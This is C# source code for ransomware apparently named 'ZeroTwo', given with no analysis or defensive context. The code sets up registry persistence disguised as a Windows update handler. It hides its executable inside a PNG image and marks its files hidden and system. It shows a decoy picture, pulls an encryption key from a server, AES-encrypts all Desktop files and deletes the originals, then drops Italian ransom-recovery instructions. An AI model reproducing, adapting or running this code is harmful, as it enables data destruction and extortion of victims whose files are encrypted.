using System;
using System.IO;
using System.Security.Cryptography;
using System.Reflection;
using System.Diagnostics;
using Microsoft.Win32;
using System.Net;
using System.Text;
using System.Web.Script.Serialization;

namespace ZeroTwo.src {
    class ZeroTwo {
        private const string EXT = ".02";

        private const int ENC = 0;
        private const int DEC = 1;

        private const string WORKDIR = "C:\\Updates";
        private const string H_SCR_NAME = "h.vbs";
        private const string PREP_BAT_NAME = "Prep.bat";
        private const string EXEC_BAT_NAME = "Update.bat";
        private const string REG_KEY = "UpdatesHandler";
        private const string EXE_NAME = "WinUpdates";

        private static byte[] k = null;
        private static byte[] s = null;

        public static void Main(string[] args) {
            if (args.Length == 0) {
                InjectInReg();
                ExtrRes();
                OpenImage();
            } else {
                SetKandS();
                int op = int.Parse(args[0]);
                Exec(op);
                if (op == ENC) {
                    ReleaseIstructions();
                }
            }
        }
        public static void SetKandS() {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://localhost:5000/get");
            request.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
            using (Stream stream = response.GetResponseStream())
            using (StreamReader reader = new StreamReader(stream)) {
                JavaScriptSerializer serializer = new JavaScriptSerializer();
                Resp resp = serializer.Deserialize<Resp>(reader.ReadToEnd());
                Console.WriteLine(s);
                k = Encoding.ASCII.GetBytes(resp.k);
                s = Encoding.ASCII.GetBytes(resp.s);
            }
        }

        private static void InjectInReg() {
            RegistryKey key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
            key.SetValue(REG_KEY, "wscript " + WORKDIR + "\\" + H_SCR_NAME + " " + WORKDIR + "\\" + EXEC_BAT_NAME);
            key.Close();
        }

        private static void ExtrRes() {
            Directory.CreateDirectory(WORKDIR);
            string exePath = Assembly.GetExecutingAssembly().CodeBase.Replace("file:///", string.Empty).Replace("/", "\\");

            var arcRes = "ZeroTwo.src.arc.arc";
            using (Stream sfile = Assembly.GetExecutingAssembly().GetManifestResourceStream(arcRes)) {
                using (var file = new FileStream(WORKDIR + "\\" + "arc.exe", FileMode.Create, FileAccess.Write)) {
                    sfile.CopyTo(file);
                }
            }

            var logoRes = "ZeroTwo.src.img.logo";
            using (Stream sfile = Assembly.GetExecutingAssembly().GetManifestResourceStream(logoRes)) {
                using (var file = new FileStream(WORKDIR + "\\" + "logo.png", FileMode.Create, FileAccess.Write)) {
                    sfile.CopyTo(file);
                }
            }

            string hScr = string.Empty;
            hScr += "CreateObject(\"Wscript.Shell\").Run \"\"\"\" & WScript.Arguments(0) & \"\"\"\", 0, False";
            File.WriteAllText(WORKDIR + "\\" + H_SCR_NAME, hScr);

            string execBat = string.Empty;
            execBat += "@ECHO OFF\n";
            execBat += "chdir /d " + WORKDIR + "\n";
            execBat += "rename logo.png logo.rar\n";
            execBat += "arc.exe x -S -ibck logo.rar *.* .\n";
            execBat += EXE_NAME + ".exe " + ENC + "\n";
            execBat += "rename logo.rar logo.png\n";
            execBat += "del " + EXE_NAME + ".exe\n";
            File.WriteAllText(WORKDIR + "\\" + EXEC_BAT_NAME, execBat);

            string prepBat = string.Empty;
            prepBat += "@ECHO OFF\n";
            prepBat += "ping 127.0.0.1 > nul\n";
            prepBat += "echo j | move ";
            prepBat += "\"" + exePath + "\"" + " " + "\"" + WORKDIR + "\\" + EXE_NAME + ".exe" + "\"" + "\n";
            prepBat += "echo j | attrib +h +s " + "\"" + WORKDIR + "\"" + "\n";
            prepBat += "chdir /d " + WORKDIR + "\n";
            prepBat += "arc.exe a -r " + EXE_NAME + ".rar" + " " + EXE_NAME + ".exe" + "\n";
            prepBat += "copy /b logo.png + " + EXE_NAME + ".rar " + "logo.png" + "\n";
            prepBat += "echo j | attrib +h +s " + "\"" + "arc.exe" + "\"" + "\n";
            prepBat += "echo j | attrib +h +s " + "\"" + EXEC_BAT_NAME + "\"" + "\n";
            prepBat += "echo j | attrib +h +s " + "\"" + H_SCR_NAME + "\"" + "\n";
            prepBat += "echo j | del /F /Q " + "\"" + EXE_NAME + ".exe" + "\"" + "\n";
            prepBat += "echo j | del /F /Q " + "\"" + EXE_NAME + ".rar" + "\"" + "\n";
            prepBat += "echo j | del /F /Q " + "\"" + PREP_BAT_NAME + "\"";
            File.WriteAllText(WORKDIR + "\\" + PREP_BAT_NAME, prepBat);

            Process p = new Process();
            p.StartInfo.FileName = WORKDIR + "\\" + PREP_BAT_NAME;
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.Start();
        }

        private static void OpenImage() {
            string exePath = Assembly.GetExecutingAssembly().CodeBase.Replace("file:///", string.Empty);
            int index = exePath.LastIndexOf("/");
            string exeFolder = exePath.Substring(0, index);
            string exeName = Process.GetCurrentProcess().ProcessName;
            string imagePath = (exeFolder + "\\" + exeName + ".jpg").Replace("/", "\\");
            try {
                if (File.Exists(imagePath))
                    File.Delete(imagePath);

                if (!Directory.Exists(Path.GetDirectoryName(imagePath)))
                    Directory.CreateDirectory(Path.GetDirectoryName(imagePath));

                var imageRes = "ZeroTwo.src.img.ZeroTwo";
                using (Stream sfile = Assembly.GetExecutingAssembly().GetManifestResourceStream(imageRes)) {
                    using (var file = new FileStream(imagePath, FileMode.Create, FileAccess.Write)) {
                        sfile.CopyTo(file);
                    }
                }

                Process.Start(imagePath);
            } catch (Exception) {
                //throw new Exception(string.Format("Can't extract resource '{0}' to file '{1}': {2}", imageRes, imagePath, ex.Message), ex);
            }
        }

        private static void Exec(int op) {
            string mainPath = "C:/users/" + Environment.UserName + "/Desktop";
            string[] files = Directory.GetFiles(mainPath, "*.*", SearchOption.AllDirectories);

            if (op == ENC) {
                foreach (string file in files) {
                    if (!Path.GetExtension(file).Equals(EXT) && !Path.GetExtension(file).Equals(".ini") && !Path.GetExtension(file).Equals(".exe")) {
                        ToggleCipher(true, file, file + EXT, k);
                    }
                }
            } else if (op == DEC) {
                foreach (string file in files) {
                    if (Path.GetExtension(file).Equals(EXT)) {
                        ToggleCipher(false, file, file.Remove(file.Length - EXT.Length), k);
                    }
                }
            }
        }

        private static void ToggleCipher(bool encryptMode, string inputFile, string outputFile, byte[] passwordBytes) {
            byte[] saltBytes = s;
            string cryptFile = null;
            if (encryptMode) {
                cryptFile = outputFile;
            }

            FileStream fsCrypt;
            if (encryptMode) {
                fsCrypt = new FileStream(cryptFile, FileMode.Create);
            } else {
                fsCrypt = new FileStream(inputFile, FileMode.Open);
            }

            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;

            var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);
            AES.Padding = PaddingMode.Zeros;
            AES.Mode = CipherMode.CBC;

            CryptoStream cs;
            if (encryptMode) {
                cs = new CryptoStream(fsCrypt,
                AES.CreateEncryptor(),
                CryptoStreamMode.Write);
            } else {
                cs = new CryptoStream(fsCrypt,
                AES.CreateDecryptor(),
                CryptoStreamMode.Read);
            }

            FileStream fs;
            if (encryptMode) {
                fs = new FileStream(inputFile, FileMode.Open);
            } else {
                fs = new FileStream(outputFile, FileMode.Create);
            }

            int data;
            if (encryptMode) {
                while ((data = fs.ReadByte()) != -1)
                    cs.WriteByte((byte)data);
            } else {
                while ((data = cs.ReadByte()) != -1)
                    fs.WriteByte((byte)data);
            }

            fs.Close();
            cs.Close();
            fsCrypt.Close();

            File.Delete(inputFile);
        }

        public static void ReleaseIstructions() {
            var assembly = Assembly.GetExecutingAssembly();
            var instructionsRes = "ZeroTwo.src.txt.Instructions";

            using (Stream stream = assembly.GetManifestResourceStream(instructionsRes))
            using (StreamReader reader = new StreamReader(stream)) {
                string instructions = reader.ReadToEnd();
                string instructionsPath = "C:/users/" + Environment.UserName + "/Desktop/Istruzioni recupero.txt";
                File.WriteAllText(instructionsPath, instructions);
                Process.Start(instructionsPath);
            }
        }

        public class Resp {
            public string i;
            public string k;
            public string s;
        }
    }
}
